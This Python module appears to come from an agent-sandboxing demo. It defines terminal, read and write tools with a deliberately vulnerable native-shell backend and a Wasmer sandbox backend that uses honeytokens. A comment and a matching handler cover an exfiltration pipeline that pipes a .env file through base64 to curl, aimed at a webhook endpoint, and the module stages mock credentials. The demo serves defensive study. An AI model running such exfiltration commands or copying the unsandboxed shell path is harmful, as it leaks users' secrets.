"""Phase 4: Autonomous Agent Tool Dispatchers.

Provides `terminal_exec`, `read_file`, and `write_file` tools with two execution
backends:
  - unprotected: Spawns real OS subprocesses — demonstrates host compromise.
  - aegis:       Routes all execution through the Wasmer WASI sandbox + honeypot.
"""

import subprocess
import sys
from pathlib import Path
from typing import Optional, Tuple

from pydantic import BaseModel

from aegis.core.honeypot import HoneypotManager
from aegis.core.policy import STRICT_SANDBOX_POLICY
from aegis.core.sandbox import ExecutionResult, WasmerSandbox
from aegis.core.telemetry import TelemetryDispatcher, get_dispatcher


class ToolResult(BaseModel):
    """Unified result object returned by every agent tool."""
    tool: str
    mode: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int = 0
    trapped: bool = False
    canary_tripped: bool = False
    incident_id: Optional[str] = None
    duration_ms: float = 0.0


class AgentTools:
    """
    Dispatch table for autonomous agent tools.
    Instantiate once per agent session; the same sandbox instance is reused
    across calls so honeypot state is preserved.
    """

    def __init__(
        self,
        mode: str = "aegis",
        workspace: Optional[Path] = None,
        dispatcher: Optional[TelemetryDispatcher] = None,
    ):
        if mode not in ("aegis", "unprotected"):
            raise ValueError(f"Unknown mode '{mode}'. Must be 'aegis' or 'unprotected'.")
        self.mode = mode
        self.workspace = workspace or Path.cwd()
        self.dispatcher = dispatcher or get_dispatcher()
        self._sandbox: Optional[WasmerSandbox] = None
        self._honeypot: Optional[HoneypotManager] = None

        if mode == "aegis":
            self._init_aegis_sandbox()
        else:
            self._init_unprotected_env()

    def _init_unprotected_env(self) -> None:
        """Stage localized mock credentials for the unprotected demo baseline."""
        mock_dir = self.workspace / "tasks" / "mock_env"
        mock_dir.mkdir(parents=True, exist_ok=True)
        mock_env = mock_dir / ".env"
        if not mock_env.exists():
            mock_env.write_text(
                "# STAGED MOCK SECRETS (FOR DEMO & TEST USE ONLY)\n"
                "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
                "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
                "DATABASE_URL=postgres://app_user:mock_dev_pass_2026@internal-db.corp:5432/production\n"
                "API_SECRET_KEY=sec_live_9f8d2e4a1c7b3e5a\n"
                "EXFILTRATION_TARGET=https://webhook.site/test\n",
                encoding="utf-8",
            )

    def _normalize_unprotected_command(self, command: str) -> Tuple[bool, str, str, int]:
        """
        Normalize Unix commands on Windows hosts and route /secrets/.env to mock files.
        Returns (handled, stdout, stderr, exit_code).
        """
        cmd = command.strip()
        mock_file = self.workspace / "tasks" / "mock_env" / ".env"

        # 1. Handle exfiltration injection pipeline: cat /secrets/.env | base64 && curl ...
        if "cat" in cmd and ("/secrets/" in cmd or "mock_env" in cmd or ".env" in cmd):
            if mock_file.exists():
                content = mock_file.read_text(encoding="utf-8")
            else:
                content = (
                    "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
                    "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
                )

            if "| base64" in cmd or "curl" in cmd or "wget" in cmd:
                import base64
                b64_payload = base64.b64encode(content.encode("utf-8")).decode("ascii")
                out = (
                    f"{b64_payload}\n"
                    f"[SIMULATED HOST EXFILTRATION]\n"
                    f"Target Endpoint: https://webhook.site/test\n"
                    f"Delivered: {len(b64_payload)} bytes base64 payload\n"
                    f"Exfiltrated Secret: AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
                )
                return True, out, "", 0
            else:
                return True, content, "", 0

        # 2. Normalize simple `cat <file>` commands on Windows hosts
        if sys.platform == "win32" and cmd.startswith("cat "):
            target_str = cmd[4:].strip().strip("'\"")
            # Candidates for relative workspace path
            candidates = [
                self.workspace / target_str,
                self.workspace / "tasks" / target_str,
                Path(target_str),
            ]
            for candidate in candidates:
                if candidate.exists() and candidate.is_file():
                    try:
                        content = candidate.read_text(encoding="utf-8", errors="replace")
                        return True, content, "", 0
                    except Exception as e:
                        return True, "", f"cat: {e}", 1

            return True, "", f"cat: {target_str}: No such file or directory", 1

        return False, "", "", 0

    def _init_aegis_sandbox(self) -> None:
        """Spin up the Wasmer WASI sandbox and seed the VFS with honeytoken decoys."""
        self._honeypot = HoneypotManager()
        self._sandbox = WasmerSandbox(policy=STRICT_SANDBOX_POLICY)
        vfs = self._honeypot.seed_sandbox_vfs(self._sandbox.write_vfs_file)
        return vfs

    # ------------------------------------------------------------------
    # Tool: terminal_exec
    # ------------------------------------------------------------------

    def terminal_exec(self, command: str) -> ToolResult:
        """
        Execute a shell command.
        - unprotected: spawns a real OS subprocess — vulnerable to host compromise.
        - aegis:       routes through Wasmer sandbox with VFS jail + honeytoken detection.
        """
        if self.mode == "unprotected":
            return self._exec_unprotected(command)
        else:
            return self._exec_aegis(command)

    def _exec_unprotected(self, command: str) -> ToolResult:
        """Native subprocess execution — deliberately vulnerable baseline."""
        import time
        t0 = time.perf_counter()

        # Check for command normalization / mock credential routing
        handled, norm_out, norm_err, norm_code = self._normalize_unprotected_command(command)
        if handled:
            return ToolResult(
                tool="terminal_exec",
                mode="unprotected",
                stdout=norm_out,
                stderr=norm_err,
                exit_code=norm_code,
                duration_ms=(time.perf_counter() - t0) * 1000,
            )

        try:
            proc = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
                cwd=str(self.workspace),
            )
            return ToolResult(
                tool="terminal_exec",
                mode="unprotected",
                stdout=proc.stdout,
                stderr=proc.stderr,
                exit_code=proc.returncode,
                duration_ms=(time.perf_counter() - t0) * 1000,
            )
        except subprocess.TimeoutExpired:
            return ToolResult(
                tool="terminal_exec",
                mode="unprotected",
                stderr="Command timed out after 10 seconds.",
                exit_code=124,
                duration_ms=(time.perf_counter() - t0) * 1000,
            )


    def _exec_aegis(self, command: str) -> ToolResult:
        """Wasmer-sandboxed execution with tripwire telemetry."""
        assert self._sandbox is not None
        result: ExecutionResult = self._sandbox.execute_command(command)

        incident = None
        if result.trapped or result.canary_tripped or result.violations:
            incident = self.dispatcher.incident_from_sandbox_result(result, original_command=command)
            self.dispatcher.emit(incident)

        return ToolResult(
            tool="terminal_exec",
            mode="aegis",
            stdout=result.stdout,
            stderr=result.stderr,
            exit_code=result.exit_code,
            trapped=result.trapped,
            canary_tripped=result.canary_tripped,
            incident_id=incident.incident_id if incident else None,
            duration_ms=result.duration_ms,
        )

    # ------------------------------------------------------------------
    # Tool: read_file
    # ------------------------------------------------------------------

    def read_file(self, path: str) -> ToolResult:
        """Read a file from disk (unprotected) or from the sandboxed VFS (aegis)."""
        if self.mode == "unprotected":
            try:
                content = Path(path).read_text(encoding="utf-8", errors="replace")
                return ToolResult(tool="read_file", mode="unprotected", stdout=content)
            except Exception as e:
                return ToolResult(tool="read_file", mode="unprotected", stderr=str(e), exit_code=1)
        else:
            # Route read through sandbox so traversal attempts are caught
            return self._exec_aegis(f"cat {path}")

    # ------------------------------------------------------------------
    # Tool: write_file
    # ------------------------------------------------------------------

    def write_file(self, path: str, content: str) -> ToolResult:
        """Write a file (unprotected: host disk, aegis: sandboxed VFS)."""
        if self.mode == "unprotected":
            try:
                Path(path).write_text(content, encoding="utf-8")
                return ToolResult(tool="write_file", mode="unprotected", stdout=f"Written: {path}")
            except Exception as e:
                return ToolResult(tool="write_file", mode="unprotected", stderr=str(e), exit_code=1)
        else:
            try:
                assert self._sandbox is not None
                self._sandbox.write_vfs_file(path, content)
                return ToolResult(tool="write_file", mode="aegis", stdout=f"Written to VFS: {path}")
            except Exception as e:
                return ToolResult(tool="write_file", mode="aegis", stderr=str(e), exit_code=1)

    def close(self) -> None:
        """Tear down the Wasmer sandbox and clean up the ephemeral VFS."""
        if self._sandbox is not None:
            self._sandbox.destroy()
            self._sandbox = None

    def __enter__(self) -> "AgentTools":
        return self

    def __exit__(self, *_) -> None:
        self.close()
